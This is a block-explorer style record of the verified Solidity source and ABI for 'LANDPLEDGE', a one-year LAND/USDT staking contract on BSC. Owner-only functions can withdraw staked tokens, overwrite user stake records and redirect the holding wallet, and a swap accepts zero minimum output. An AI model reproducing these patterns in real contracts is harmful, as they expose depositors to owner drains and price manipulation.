{"SourceCode": "pragma solidity ^0.6.0;\r\n// SPDX-License-Identifier: Unlicensed\r\n\r\n  \r\n \r\nlibrary SafeMath {\r\n\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    require(c >= a, \"SafeMath: addition overflow\");\r\n    return c;\r\n  }\r\n\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return sub(a, b, \"SafeMath: subtraction overflow\");\r\n  }\r\n\r\n  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b <= a, errorMessage);\r\n    uint256 c = a - b;\r\n    return c;\r\n  }\r\n\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    uint256 c = a * b;\r\n    require(c / a == b, \"SafeMath: multiplication overflow\");\r\n    return c;\r\n  }\r\n\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return div(a, b, \"SafeMath: division by zero\");\r\n  }\r\n\r\n  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b > 0, errorMessage);\r\n    uint256 c = a / b;\r\n    return c;\r\n  }\r\n\r\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return mod(a, b, \"SafeMath: modulo by zero\");\r\n  }\r\n\r\n  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b != 0, errorMessage);\r\n    return a % b;\r\n  }\r\n}\r\n\r\n\r\n    interface Erc20Token {//konwnsec//ERC20 \u63a5\u53e3\r\n        function totalSupply() external view returns (uint256);\r\n        function balanceOf(address _who) external view returns (uint256);\r\n        function transfer(address _to, uint256 _value) external;\r\n        function allowance(address _owner, address _spender) external view returns (uint256);\r\n        function transferFrom(address _from, address _to, uint256 _value) external;\r\n        function approve(address _spender, uint256 _value) external; \r\n        function burnFrom(address _from, uint256 _value) external; \r\n        event Transfer(address indexed from, address indexed to, uint256 value);\r\n        event Approval(address indexed owner, address indexed spender, uint256 value);\r\n        \r\n\r\n    }\r\n    \r\n \r\n    \r\n// \u57fa\u7c7b\u5408\u7ea6\r\n    contract Base {\r\n        using SafeMath for uint;\r\n        Erc20Token constant internal _LANDIns = Erc20Token(0x9131066022B909C65eDD1aaf7fF213dACF4E86d0); \r\n         Erc20Token constant internal USDT = Erc20Token(0x55d398326f99059fF775485246999027B3197955); \r\n\r\n \r\n        uint256 public _startTime;\r\n        address  _owner;\r\n\r\n       \r\n    \r\n        modifier onlyOwner() {\r\n            require(msg.sender == _owner, \"Permission denied\"); _;\r\n        }\r\n        modifier isZeroAddr(address addr) {\r\n            require(addr != address(0), \"Cannot be a zero address\"); _; \r\n        }\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        require(newOwner != address(0));\r\n        _owner = newOwner;\r\n    }\r\n    receive() external payable {}  \r\n} \r\ncontract DataPlayer is Base{\r\n        struct stakeInfo {\r\n            uint256 id; \r\n            uint256 amount; \r\n            uint256 time; \r\n            uint256 blockHigh; \r\n            uint256 endTime;\r\n        }\r\n        struct Player{\r\n             stakeInfo[] list; \r\n             uint256  ALLamount; \r\n        }\r\n \r\n    mapping(uint256 => Player) public _playerMap; \r\n    mapping(address => uint256) public _playerAddrMap; \r\n    uint256 public _playerCount; \r\n    address public WAddress = 0xCc9C5bd0717A8489375ff24472d5c98A2520af7d;\r\n    uint256 public ALLNamount; \r\n\r\n    \r\n\r\n    function getlistByAddr(address playerAddr, uint256 indexid) public view returns(uint256[] memory) { \r\n        uint256 id = _playerAddrMap[playerAddr];\r\n        Player memory player = _playerMap[id];\r\n        uint256[] memory temp = new uint256[](4);\r\n        temp[0] = player.list[indexid].amount;\r\n        temp[1] = player.list[indexid].endTime;\r\n        temp[2] = player.list[indexid].time;\r\n        return temp; \r\n    }\r\n\r\n \r\n    function getIdByAddr(address addr) public view returns(uint256) { \r\n        return _playerAddrMap[addr]; \r\n    }\r\n \r\n \r\n}\r\n\r\n interface IUniswapV2Router01 {\r\n\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n\r\n\r\n \r\n\r\n    function swapExactTokensForTokens(\r\n\r\n        uint amountIn,\r\n\r\n        uint amountOutMin,\r\n\r\n        address[] calldata path,\r\n\r\n        address to,\r\n\r\n        uint deadline\r\n\r\n    ) external returns (uint[] memory amounts);\r\n\r\n    function swapTokensForExactTokens(\r\n\r\n        uint amountOut,\r\n\r\n        uint amountInMax,\r\n\r\n        address[] calldata path,\r\n\r\n        address to,\r\n\r\n        uint deadline\r\n\r\n    ) external returns (uint[] memory amounts);\r\n\r\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n\r\n        external\r\n\r\n        payable\r\n\r\n        returns (uint[] memory amounts);\r\n\r\n \r\n\r\n \r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n\r\n        uint amountIn,\r\n\r\n        uint amountOutMin,\r\n\r\n        address[] calldata path,\r\n\r\n        address to,\r\n\r\n        uint deadline\r\n\r\n    ) external;\r\n\r\n \r\n\r\n}\r\ncontract LANDPLEDGE is DataPlayer {\r\n    uint256 private constant  year = 365*24*60*60;\r\n        IUniswapV2Router02 public immutable uniswapV2Router;\r\n\r\n    constructor()\r\n  public {\r\n        _owner = msg.sender; \r\n        _startTime = block.timestamp;\r\n \r\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);\r\n        uniswapV2Router = _uniswapV2Router;\r\n        USDT.approve(address(0x10ED43C718714eb63d5aA57B78B54704E256024E), 10000000000000000000000000000000000000000000000000000);\r\n    }\r\n\r\n\r\n    function transferLAND2(uint256 LPamount,address playerAddr) internal {\r\n        _LANDIns.transferFrom(playerAddr, address(WAddress), LPamount);\r\n    }\r\n\r\n    modifier isRealPlayer() {\r\n        uint256 id = _playerAddrMap[msg.sender];\r\n        require(id > 0, \"no this user\"); // \u7528\u6237\u4e0d\u5b58\u5728\r\n        _; \r\n    }\r\n\r\n    function registry(address playerAddr) internal isZeroAddr(playerAddr)   {\r\n        uint256 id = _playerAddrMap[playerAddr];\r\n        if (id == 0) {\r\n            _playerCount++;\r\n            _playerAddrMap[playerAddr] = _playerCount; \r\n        }\r\n    }\r\n    \r\n    function redeem() public  isRealPlayer   {\r\n        uint256 id = _playerAddrMap[msg.sender];\r\n        stakeInfo[] memory stakeList = _playerMap[id].list;\r\n        uint256 staticaAmount = 0;\r\n        for (uint256 i = 0; i < stakeList.length; i++) {\r\n            if(block.timestamp>stakeList[i].endTime){\r\n              staticaAmount =  staticaAmount.add(stakeList[i].amount);\r\n                delete _playerMap[id].list[i];\r\n             }\r\n        }\r\n        require(staticaAmount > 0, \" this field\" ); \r\n        _LANDIns.transfer(address(WAddress), staticaAmount);\r\n        _LANDIns.transferFrom(WAddress, address(msg.sender),staticaAmount);\r\n        _playerMap[id].ALLamount = _playerMap[id].ALLamount.sub(staticaAmount);\r\n      \r\n    }\r\n\r\n    function CLAIM(uint256  Amount ) public  onlyOwner  {\r\n        _LANDIns.transfer(_owner, Amount);\r\n    }\r\n \r\n    function transferWAddressship(address newOwner) public onlyOwner {\r\n        require(newOwner != address(0));\r\n        WAddress = newOwner;\r\n    }\r\n\r\n    function SynchroniseQuantity(\r\n        uint256[] calldata idS,\r\n        uint256[] calldata amountS,\r\n        address[] calldata AddressS,\r\n        uint256[] calldata tampS\r\n     ) public onlyOwner {\r\n        for (uint256 i=0; i<idS.length; i++) {\r\n            uint256 id = idS[i];\r\n            address Address = AddressS[i];\r\n            _playerAddrMap[Address] = id;\r\n            uint256 startTime =tampS[i] ;\r\n            uint256 endTime = startTime.add(year);\r\n            _playerMap[id].ALLamount = _playerMap[id].ALLamount.add(amountS[i]);\r\n            stakeInfo memory info = stakeInfo(id, amountS[i], startTime, block.number,endTime);\r\n            _playerMap[id].list.push(info);\r\n        }\r\n    } \r\n\r\n    function SetplayerCount(uint256 playerCount) public onlyOwner {\r\n            _playerCount =  playerCount;\r\n    }\r\n\r\n    function UsdtForERC20(uint256 tokenAmount) internal  returns(uint256 ) {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(USDT);\r\n        path[1] = address(_LANDIns);\r\n        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,  \r\n            path,\r\n            address(WAddress),\r\n            block.timestamp\r\n        );\r\n        uint256 ERC20Balance = _LANDIns.balanceOf(address(WAddress));\r\n        _LANDIns.transferFrom(WAddress, address(this),ERC20Balance);\r\n        return ERC20Balance;\r\n\r\n    }\r\n    function U2L(uint256 amount) public   {\r\n        USDT.transferFrom(msg.sender, address(this), amount);\r\n        uint256 LANDBalance = UsdtForERC20(amount);\r\n        registry(msg.sender);\r\n        uint256 id = _playerAddrMap[msg.sender];\r\n        uint256 endTime =block.timestamp.add(year);\r\n        stakeInfo[] memory stakeList = _playerMap[id].list;\r\n  \r\n        uint256 index = 10000;\r\n        for (uint256 i = 0; i < stakeList.length; i++) {\r\n            if (stakeList[i].id == 0){\r\n                    index = i;\r\n                    break;\r\n            }\r\n        }\r\n        if (index != 10000){\r\n                _playerMap[id].list[index].id = id;\r\n                _playerMap[id].list[index].amount = LANDBalance;\r\n                _playerMap[id].list[index].time = block.timestamp;\r\n                _playerMap[id].list[index].blockHigh = block.number;\r\n                _playerMap[id].list[index].endTime = endTime;\r\n        }\r\n        else{\r\n                stakeInfo memory info = stakeInfo(id, LANDBalance, block.timestamp, block.number,endTime);\r\n                _playerMap[id].list.push(info);\r\n            }\r\n        id = _playerAddrMap[msg.sender];\r\n        _playerMap[id].ALLamount = _playerMap[id].ALLamount.add(LANDBalance);\r\n        ALLNamount = ALLNamount.add(LANDBalance);\r\n    }\r\n\r\n    function SL(uint256 amount) public {\r\n        transferLAND2( amount, msg.sender);\r\n        _LANDIns.transferFrom(WAddress, address(this), amount);\r\n        registry(msg.sender);\r\n        uint256 id = _playerAddrMap[msg.sender];\r\n        uint256 endTime =block.timestamp.add(year);\r\n        stakeInfo[] memory stakeList = _playerMap[id].list;\r\n  \r\n        uint256 index = 10000;\r\n        for (uint256 i = 0; i < stakeList.length; i++) {\r\n            if (stakeList[i].id == 0){\r\n                    index = i;\r\n                    break;\r\n            }\r\n        }\r\n            if (index != 10000){\r\n                _playerMap[id].list[index].id = id;\r\n                _playerMap[id].list[index].amount = amount;\r\n                _playerMap[id].list[index].time = block.timestamp;\r\n                _playerMap[id].list[index].blockHigh = block.number;\r\n                _playerMap[id].list[index].endTime = endTime;\r\n            }else{\r\n                stakeInfo memory info = stakeInfo(id, amount, block.timestamp, block.number,endTime);\r\n                _playerMap[id].list.push(info);\r\n            }\r\n          id = _playerAddrMap[msg.sender];\r\n        _playerMap[id].ALLamount = _playerMap[id].ALLamount.add(amount);\r\n        ALLNamount = ALLNamount.add(amount);\r\n    }\r\n\r\n\r\nfunction SetALLamount(uint256 ALL) public onlyOwner {\r\n        ALLNamount =  ALL;\r\n    }\r\n\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"ALLNamount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"Amount\",\"type\":\"uint256\"}],\"name\":\"CLAIM\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"SL\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"ALL\",\"type\":\"uint256\"}],\"name\":\"SetALLamount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"playerCount\",\"type\":\"uint256\"}],\"name\":\"SetplayerCount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256[]\",\"name\":\"idS\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"amountS\",\"type\":\"uint256[]\"},{\"internalType\":\"address[]\",\"name\":\"AddressS\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"tampS\",\"type\":\"uint256[]\"}],\"name\":\"SynchroniseQuantity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"U2L\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"WAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_playerAddrMap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_playerCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"_playerMap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"ALLamount\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_startTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"getIdByAddr\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"playerAddr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"indexid\",\"type\":\"uint256\"}],\"name\":\"getlistByAddr\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"redeem\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferWAddressship\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "LANDPLEDGE", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://432b2beca8021ae5a9fce389f45563cdfb49591fd16203e8a8f1ebdf77724e51"}